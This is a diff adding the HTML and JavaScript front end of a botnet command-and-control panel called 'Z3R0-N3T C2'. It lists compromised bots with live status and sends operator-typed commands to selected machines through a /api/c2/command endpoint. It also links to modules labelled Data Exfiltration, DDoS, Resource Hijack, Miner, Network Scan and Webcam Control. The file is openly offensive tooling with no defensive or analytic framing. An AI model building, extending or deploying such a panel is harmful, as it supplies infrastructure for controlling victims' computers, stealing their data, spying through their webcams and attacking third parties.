@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Z3R0-N3T C2</title>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: #bf00ff;
+            font-family: "Courier New", Courier, monospace;
+            margin: 0;
+            padding: 20px;
+        }
+        h1, h2 {
+            text-align: center;
+            text-shadow: 0 0 5px #bf00ff;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .panel {
+            background-color: #2a2a2a;
+            border: 1px solid #bf00ff;
+            border-radius: 5px;
+            padding: 15px;
+        }
+        #bots, #output {
+            height: 200px;
+            overflow-y: scroll;
+            border: 1px solid #bf00ff;
+            padding: 10px;
+            background-color: #111;
+        }
+        #bots ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+        }
+        #bots li {
+            cursor: pointer;
+            padding: 5px;
+            display: flex;
+            align-items: center;
+        }
+        #bots li:hover, #bots li.selected {
+            background-color: #bf00ff;
+            color: #1a1a1a;
+        }
+        .status-circle {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 10px;
+        }
+        .status-green {
+            background-color: #00ff00;
+        }
+        .status-yellow {
+            background-color: #ffff00;
+        }
+        .status-red {
+            background-color: #ff0000;
+        }
+        input[type="text"], button {
+            background-color: #333;
+            color: #bf00ff;
+            border: 1px solid #bf00ff;
+            padding: 8px;
+            width: calc(100% - 18px);
+        }
+        button {
+            cursor: pointer;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #bf00ff;
+            color: #1a1a1a;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Botnet Command & Control</h1>
+
+    <div class="container">
+        <div class="panel">
+            <h2>Bots</h2>
+            <div id="bots">
+                <ul>
+                    <!-- Bots will be dynamically populated here -->
+                </ul>
+            </div>
+        </div>
+
+        <div class="panel">
+            <h2>Modules</h2>
+            <button onclick="window.location.href='/DATA_EXFILTRATION_MOD'">Data Exfiltration</button>
+            <button onclick="window.location.href='/DDOS_MOD'">DDoS</button>
+            <button onclick="window.location.href='/GEOLOCATION_MOD'">Geolocation</button>
+            <button onclick="window.location.href='/HIJACK_MOD'">Resource Hijack</button>
+            <button onclick="window.location.href='/MINER_MOD'">Miner</button>
+            <button onclick="window.location.href='/NET_SCAN_MOD'">Network Scan</button>
+            <button onclick="window.location.href='/WEBCAM_MOD'">Webcam Control</button>
+            <button onclick="window.location.href='/RESOURCE'">Resource</button>
+        </div>
+
+        <div class="panel">
+            <h2>Command</h2>
+            <input type="text" id="command" placeholder="Enter command for selected bot(s)">
+            <br><br>
+            <button onclick="sendCommand()">Send Command</button>
+        </div>
+
+        <div class="panel">
+            <h2>Output</h2>
+            <div id="output">
+                <!-- Command output will be displayed here -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const botsList = document.getElementById('bots').getElementsByTagName('ul')[0];
+        const commandInput = document.getElementById('command');
+        const outputDiv = document.getElementById('output');
+
+        let selectedBots = [];
+
+        function updateBotList(bots) {
+            botsList.innerHTML = '';
+            for (const botId in bots) {
+                const bot = bots[botId];
+                const li = document.createElement('li');
+
+                const statusCircle = document.createElement('span');
+                statusCircle.className = `status-circle status-${bot.status}`;
+
+                const botIdSpan = document.createElement('span');
+                botIdSpan.textContent = botId;
+
+                li.appendChild(statusCircle);
+                li.appendChild(botIdSpan);
+
+                li.onclick = () => toggleBotSelection(li, botId);
+                if (selectedBots.includes(botId)) {
+                    li.classList.add('selected');
+                }
+                botsList.appendChild(li);
+            }
+        }
+
+        function toggleBotSelection(li, botId) {
+            const index = selectedBots.indexOf(botId);
+            if (index > -1) {
+                selectedBots.splice(index, 1);
+                li.classList.remove('selected');
+            } else {
+                selectedBots.push(botId);
+                li.classList.add('selected');
+            }
+        }
+
+        function sendCommand() {
+            const command = commandInput.value;
+            if (!command) {
+                alert("Please enter a command.");
+                return;
+            }
+            if (selectedBots.length === 0) {
+                alert("Please select at least one bot.");
+                return;
+            }
+
+            const message = {
+                targets: selectedBots,
+                command: command
+            };
+
+            fetch('/api/c2/command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(message)
+            })
+            .then(response => response.json())
+            .then(data => {
+                logToOutput(`Command sent to ${selectedBots.join(', ')}. Response: ${JSON.stringify(data)}`);
+            })
+            .catch(error => {
+                console.error('Error sending command:', error);
+                logToOutput('Error sending command.');
+            });
+
+            commandInput.value = '';
+        }
+
+        function logToOutput(message) {
+            const p = document.createElement('p');
+            p.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            outputDiv.appendChild(p);
+            outputDiv.scrollTop = outputDiv.scrollHeight;
+        }
+
+        function fetchBots() {
+            fetch('/api/bots')
+                .then(response => response.json())
+                .then(data => {
+                    updateBotList(data);
+                })
+                .catch(error => console.error('Error fetching bots:', error));
+        }
+
+        // Fetch bots every 5 seconds
+        setInterval(fetchBots, 5000);
+
+        // Initial fetch
+        fetchBots();
+
+    </script>
+
+</body>
+</html>
